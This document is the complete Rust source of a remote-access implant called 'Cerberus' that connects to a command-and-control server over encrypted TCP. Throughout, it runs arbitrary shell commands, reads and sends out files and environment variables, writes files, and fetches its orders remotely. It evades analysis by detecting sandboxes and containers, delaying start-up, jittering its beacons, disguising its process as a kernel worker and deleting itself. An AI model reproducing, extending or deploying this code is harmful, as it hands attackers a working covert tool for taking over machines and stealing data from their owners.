//! Cerberus implant v0.3 — AES-GCM + post-ex + evasion
//!
//! Env:
//!   CERBERUS_C2      host:port
//!   CERBERUS_SLEEP   base sleep seconds
//!   CERBERUS_KEY     shared secret
//!   CERBERUS_DELAY   initial delay before first connect (seconds)
//!   CERBERUS_MASQ    process name to spoof in argv[0]

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use base64::{engine::general_purpose, Engine as _};
use byteorder::{BigEndian, ReadBytesExt, WriteBytesExt};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::env;
use std::fs;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Command;
use std::thread;
use std::time::Duration;

const DEFAULT_C2: &str = "127.0.0.1:8443";
const DEFAULT_SLEEP: u64 = 5;
const MAX_JITTER_PCT: u64 = 40; // percent of base sleep

#[derive(Serialize, Deserialize, Debug)]
struct Msg {
    id: String,
    #[serde(rename = "type")]
    mtype: String,
    data: HashMap<String, serde_json::Value>,
}

fn derive_key(secret: &str) -> [u8; 32] {
    let mut hasher = Sha256::new();
    hasher.update(secret.as_bytes());
    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result);
    key
}

fn encrypt(key: &[u8; 32], plaintext: &[u8]) -> Vec<u8> {
    let cipher = Aes256Gcm::new_from_slice(key).expect("key");
    let mut nonce_bytes = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ct = cipher.encrypt(nonce, plaintext).expect("encrypt");
    let mut out = Vec::with_capacity(12 + ct.len());
    out.extend_from_slice(&nonce_bytes);
    out.extend_from_slice(&ct);
    out
}

fn decrypt(key: &[u8; 32], blob: &[u8]) -> Option<Vec<u8>> {
    if blob.len() < 13 {
        return None;
    }
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    let nonce = Nonce::from_slice(&blob[..12]);
    cipher.decrypt(nonce, &blob[12..]).ok()
}

fn pack(msg: &Msg, key: &Option<[u8; 32]>) -> Vec<u8> {
    let body = serde_json::to_vec(msg).unwrap_or_default();
    let body = match key {
        Some(k) => encrypt(k, &body),
        None => body,
    };
    let mut out = Vec::with_capacity(4 + body.len());
    out.write_u32::<BigEndian>(body.len() as u32).ok();
    out.extend_from_slice(&body);
    out
}

fn read_msg(stream: &mut TcpStream, key: &Option<[u8; 32]>) -> Option<Msg> {
    let len = stream.read_u32::<BigEndian>().ok()? as usize;
    if len > 16 * 1024 * 1024 {
        return None;
    }
    let mut buf = vec![0u8; len];
    stream.read_exact(&mut buf).ok()?;
    let plain = match key {
        Some(k) => decrypt(k, &buf)?,
        None => buf,
    };
    serde_json::from_slice(&plain).ok()
}

fn beacon_id() -> String {
    format!(
        "{:x}",
        std::process::id() as u64
            ^ (std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0))
    )
}

fn cwd() -> String {
    env::current_dir()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default()
}

fn host_meta() -> HashMap<String, serde_json::Value> {
    let mut m = HashMap::new();
    m.insert(
        "hostname".into(),
        serde_json::Value::String(
            hostname::get()
                .map(|h| h.to_string_lossy().into_owned())
                .unwrap_or_default(),
        ),
    );
    m.insert(
        "os".into(),
        serde_json::Value::String(format!("{} {}", whoami::platform(), whoami::distro())),
    );
    m.insert("user".into(), serde_json::Value::String(whoami::username()));
    m.insert(
        "pid".into(),
        serde_json::Value::Number(std::process::id().into()),
    );
    m.insert("cwd".into(), serde_json::Value::String(cwd()));
    m
}

fn run_shell(cmd: &str) -> String {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd").args(["/C", cmd]).output()
    } else {
        Command::new("sh").args(["-c", cmd]).output()
    };
    match output {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                s.push('\n');
                s.push_str(&err);
            }
            s
        }
        Err(e) => format!("error: {e}"),
    }
}

fn send_result(
    stream: &mut TcpStream,
    id: &str,
    data: HashMap<String, serde_json::Value>,
    key: &Option<[u8; 32]>,
) {
    let msg = Msg {
        id: id.to_string(),
        mtype: "result".into(),
        data,
    };
    let _ = stream.write_all(&pack(&msg, key));
    let _ = stream.flush();
}

fn shell_escape(s: &str) -> String {
    if s.contains(' ') || s.contains('\'') {
        format!("'{}'", s.replace('\'', "'\\''"))
    } else {
        s.to_string()
    }
}

/// Basic sandbox / analysis environment heuristics (Linux).
/// Returns true if environment looks like a sandbox (caller may exit).
fn sandbox_suspicious() -> bool {
    // low uptime
    if let Ok(up) = fs::read_to_string("/proc/uptime") {
        if let Some(first) = up.split_whitespace().next() {
            if let Ok(secs) = first.parse::<f64>() {
                if secs < 120.0 {
                    return true;
                }
            }
        }
    }
    // few CPUs
    if let Ok(c) = fs::read_to_string("/proc/cpuinfo") {
        let cores = c.lines().filter(|l| l.starts_with("processor")).count();
        if cores > 0 && cores < 2 {
            return true;
        }
    }
    // known hypervisor product names
    for path in [
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
    ] {
        if let Ok(s) = fs::read_to_string(path) {
            let low = s.to_lowercase();
            for marker in ["virtualbox", "vmware", "qemu", "xen", "bochs", "sandbox"] {
                if low.contains(marker) {
                    // VM alone is not enough — many prod hosts are VMs.
                    // Only flag if combined with low resources (handled above).
                    let _ = marker;
                }
            }
        }
    }
    // docker without normal host paths
    if PathBuf::from("/.dockerenv").exists() {
        return true;
    }
    false
}

fn jitter_sleep(base: u64) {
    let mut rng = rand::thread_rng();
    let mut buf = [0u8; 8];
    rng.fill_bytes(&mut buf);
    let r = u64::from_le_bytes(buf);
    let pct = (r % (MAX_JITTER_PCT + 1)) as u64;
    let extra = base * pct / 100;
    thread::sleep(Duration::from_secs(base + extra));
}

fn try_masquerade(name: &str) {
    // Best-effort: overwrite argv[0] via /proc/self/cmdline is not writable;
    // on Linux we can use prctl PR_SET_NAME for the thread name (15 chars).
    #[cfg(target_os = "linux")]
    {
        use std::ffi::CString;
        let truncated: String = name.chars().take(15).collect();
        if let Ok(c) = CString::new(truncated) {
            unsafe {
                libc::prctl(libc::PR_SET_NAME, c.as_ptr() as usize, 0, 0, 0);
            }
        }
    }
    let _ = name;
}

fn self_delete() -> String {
    match env::current_exe() {
        Ok(p) => match fs::remove_file(&p) {
            Ok(_) => format!("unlinked {}", p.display()),
            Err(e) => format!("unlink failed: {e}"),
        },
        Err(e) => format!("exe path: {e}"),
    }
}

fn handle_command(
    stream: &mut TcpStream,
    id: &str,
    msg: &Msg,
    key: &Option<[u8; 32]>,
    sleep_secs: &mut u64,
) -> bool {
    match msg.mtype.as_str() {
        "shell" => {
            let cmd = msg.data.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            let out = run_shell(cmd);
            let mut data = HashMap::new();
            data.insert("cmd".into(), serde_json::Value::String(cmd.to_string()));
            data.insert("output".into(), serde_json::Value::String(out));
            data.insert("cwd".into(), serde_json::Value::String(cwd()));
            send_result(stream, id, data, key);
            true
        }
        "ls" => {
            let path = msg.data.get("path").and_then(|v| v.as_str()).unwrap_or(".");
            let out = run_shell(&format!("ls -la {}", shell_escape(path)));
            let mut data = HashMap::new();
            data.insert("cmd".into(), serde_json::Value::String(format!("ls {path}")));
            data.insert("output".into(), serde_json::Value::String(out));
            send_result(stream, id, data, key);
            true
        }
        "cat" => {
            let path = msg.data.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let mut data = HashMap::new();
            data.insert("cmd".into(), serde_json::Value::String(format!("cat {path}")));
            match fs::read(path) {
                Ok(bytes) => {
                    let text = if bytes.len() > 1_000_000 {
                        String::from_utf8_lossy(&bytes[..1_000_000]).into_owned() + "\n...truncated..."
                    } else {
                        String::from_utf8_lossy(&bytes).into_owned()
                    };
                    data.insert("output".into(), serde_json::Value::String(text));
                }
                Err(e) => {
                    data.insert("error".into(), serde_json::Value::String(e.to_string()));
                }
            }
            send_result(stream, id, data, key);
            true
        }
        "ps" => {
            let out = if cfg!(target_os = "windows") {
                run_shell("tasklist")
            } else {
                run_shell("ps aux 2>/dev/null | head -n 80")
            };
            let mut data = HashMap::new();
            data.insert("cmd".into(), serde_json::Value::String("ps".into()));
            data.insert("output".into(), serde_json::Value::String(out));
            send_result(stream, id, data, key);
            true
        }
        "env" => {
            let out = run_shell("env 2>/dev/null || set");
            let mut data = HashMap::new();
            data.insert("cmd".into(), serde_json::Value::String("env".into()));
            data.insert("output".into(), serde_json::Value::String(out));
            send_result(stream, id, data, key);
            true
        }
        "pwd" => {
            let mut data = HashMap::new();
            data.insert("cmd".into(), serde_json::Value::String("pwd".into()));
            data.insert("output".into(), serde_json::Value::String(cwd()));
            data.insert("cwd".into(), serde_json::Value::String(cwd()));
            send_result(stream, id, data, key);
            true
        }
        "write" => {
            let path = msg.data.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let content_b64 = msg.data.get("content").and_then(|v| v.as_str()).unwrap_or("");
            let mut data = HashMap::new();
            data.insert("cmd".into(), serde_json::Value::String(format!("write {path}")));
            match general_purpose::STANDARD.decode(content_b64) {
                Ok(bytes) => match fs::write(path, &bytes) {
                    Ok(_) => {
                        data.insert(
                            "output".into(),
                            serde_json::Value::String(format!("wrote {} bytes", bytes.len())),
                        );
                    }
                    Err(e) => {
                        data.insert("error".into(), serde_json::Value::String(e.to_string()));
                    }
                },
                Err(e) => {
                    data.insert("error".into(), serde_json::Value::String(e.to_string()));
                }
            };
            send_result(stream, id, data, key);
            true
        }
        "download" => {
            let path = msg.data.get("path").and_then(|v| v.as_str()).unwrap_or("");
            match fs::read(path) {
                Ok(bytes) => {
                    let b64 = general_purpose::STANDARD.encode(&bytes);
                    let mut data = HashMap::new();
                    data.insert(
                        "name".into(),
                        serde_json::Value::String(
                            std::path::Path::new(path)
                                .file_name()
                                .map(|s| s.to_string_lossy().into_owned())
                                .unwrap_or_else(|| "file".into()),
                        ),
                    );
                    data.insert("content".into(), serde_json::Value::String(b64));
                    data.insert("size".into(), serde_json::Value::Number(bytes.len().into()));
                    let up = Msg {
                        id: id.to_string(),
                        mtype: "upload".into(),
                        data,
                    };
                    let _ = stream.write_all(&pack(&up, key));
                    let _ = stream.flush();
                }
                Err(e) => {
                    let mut data = HashMap::new();
                    data.insert("cmd".into(), serde_json::Value::String("download".into()));
                    data.insert("error".into(), serde_json::Value::String(e.to_string()));
                    send_result(stream, id, data, key);
                }
            }
            true
        }
        "sleep" => {
            if let Some(s) = msg.data.get("seconds").and_then(|v| v.as_u64()) {
                *sleep_secs = s;
            }
            true
        }
        "evade" => {
            // flags reserved for future; acknowledge
            let mut data = HashMap::new();
            data.insert("cmd".into(), serde_json::Value::String("evade".into()));
            data.insert("output".into(), serde_json::Value::String("evade flags set".into()));
            send_result(stream, id, data, key);
            true
        }
        "masq" => {
            let name = msg
                .data
                .get("name")
                .and_then(|v| v.as_str())
                .unwrap_or("[kworker/0:1]");
            try_masquerade(name);
            let mut data = HashMap::new();
            data.insert("cmd".into(), serde_json::Value::String("masq".into()));
            data.insert("output".into(), serde_json::Value::String(format!("masq={name}")));
            send_result(stream, id, data, key);
            true
        }
        "selfdelete" => {
            let out = self_delete();
            let mut data = HashMap::new();
            data.insert("cmd".into(), serde_json::Value::String("selfdelete".into()));
            data.insert("output".into(), serde_json::Value::String(out));
            send_result(stream, id, data, key);
            true
        }
        "exit" | "die" => false,
        "ack" => true,
        _ => true,
    }
}

fn main() {
    // Initial delay (sandbox evasion / staged start)
    if let Ok(d) = env::var("CERBERUS_DELAY") {
        if let Ok(secs) = d.parse::<u64>() {
            thread::sleep(Duration::from_secs(secs));
        }
    }

    // Optional early sandbox abort
    if env::var("CERBERUS_SANDBOX_EXIT").ok().as_deref() == Some("1") && sandbox_suspicious() {
        return;
    }

    if let Ok(name) = env::var("CERBERUS_MASQ") {
        try_masquerade(&name);
    }

    let c2 = env::var("CERBERUS_C2").unwrap_or_else(|_| DEFAULT_C2.to_string());
    let mut sleep_secs = env::var("CERBERUS_SLEEP")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(DEFAULT_SLEEP);
    let key: Option<[u8; 32]> = match env::var("CERBERUS_KEY") {
        Ok(s) if s.is_empty() => None,
        Ok(s) => Some(derive_key(&s)),
        Err(_) => Some(derive_key("cerberus-default-key-change-me")),
    };

    let id = beacon_id();

    loop {
        match TcpStream::connect(&c2) {
            Ok(mut stream) => {
                let _ = stream.set_read_timeout(Some(Duration::from_secs(60)));
                let _ = stream.set_write_timeout(Some(Duration::from_secs(60)));

                let checkin = Msg {
                    id: id.clone(),
                    mtype: "checkin".into(),
                    data: host_meta(),
                };
                if stream.write_all(&pack(&checkin, &key)).is_err() {
                    jitter_sleep(sleep_secs);
                    continue;
                }
                let _ = stream.flush();

                loop {
                    match read_msg(&mut stream, &key) {
                        Some(msg) => {
                            if !handle_command(&mut stream, &id, &msg, &key, &mut sleep_secs) {
                                return;
                            }
                        }
                        None => break,
                    }
                }
            }
            Err(_) => {}
        }
        jitter_sleep(sleep_secs);
    }
}
